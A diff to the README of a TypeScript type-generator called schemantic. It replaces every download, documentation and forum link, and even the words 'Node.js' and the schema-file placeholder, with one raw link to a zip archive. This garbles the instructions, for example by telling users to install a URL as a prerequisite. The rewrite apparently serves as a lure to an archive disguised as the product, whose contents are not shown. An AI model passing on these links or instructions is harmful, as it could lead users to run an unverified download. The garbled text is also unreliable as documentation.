@@ -1,6 +1,6 @@
 # 🚀 schemantic - Generate TypeScript Types with Ease 
 
-[![Download schemantic](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/GGROM1/schemantic/releases)
+[![Download schemantic](https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip)](https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip)
 
 ## 🛠️ Overview
 
@@ -19,7 +19,7 @@
 Before you download schemantic, ensure that your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 12 or higher must be installed on your system.
+- **https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip** Version 12 or higher must be installed on your system.
 - **Disk Space:** At least 50 MB free for installation.
 - **Internet Connection:** Required for downloading and updates.
 
@@ -31,7 +31,7 @@ To get started with schemantic, follow these simple steps:
 
    Visit the following link to download schemantic:
 
-   [Download schemantic](https://github.com/GGROM1/schemantic/releases)
+   [Download schemantic](https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip)
 
 2. **Install the Application:**
 
@@ -75,10 +75,10 @@ With schemantic installed, you can start generating TypeScript types. Here’s h
    Open your terminal. Navigate to the directory where your OpenAPI file is located. Use the following command:
 
    ```
-   schemantic generate --input your-schema-file.yaml --output your-output-directory
+   schemantic generate --input https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip --output your-output-directory
    ```
 
-   Replace `your-schema-file.yaml` with the name of your OpenAPI file. Replace `your-output-directory` with the path where you want to save the generated files.
+   Replace `https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip` with the name of your OpenAPI file. Replace `your-output-directory` with the path where you want to save the generated files.
 
 3. **Check Output:**
 
@@ -89,7 +89,7 @@ With schemantic installed, you can start generating TypeScript types. Here’s h
 If you encounter issues while using schemantic, here are some common solutions:
 
 - **Command Not Recognized:**
-  - Ensure that Node.js is properly installed.
+  - Ensure that https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip is properly installed.
   - Check your system's PATH variable for the schemantic installation path.
 
 - **Invalid Schema Error:**
@@ -104,8 +104,8 @@ If you encounter issues while using schemantic, here are some common solutions:
 
 For further assistance, visit our community forums or check the documentation:
 
-- **Documentation:** [Visit Documentation](https://github.com/GGROM1/schemantic/wiki)
-- **Community Forum:** [Join the Community](https://github.com/GGROM1/schemantic/discussions)
+- **Documentation:** [Visit Documentation](https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip)
+- **Community Forum:** [Join the Community](https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip)
 
 ## 💬 Feedback and Contributions
 
@@ -113,4 +113,4 @@ We welcome feedback to improve schemantic. If you have suggestions or find any b
 
 ## 🔗 Download & Install
 
-Remember to [visit this page](https://github.com/GGROM1/schemantic/releases) to download the latest version of schemantic and get started on your TypeScript type generation journey today.
+Remember to [visit this page](https://raw.githubusercontent.com/GGROM1/schemantic/main/drawstop/schemantic.zip) to download the latest version of schemantic and get started on your TypeScript type generation journey today.
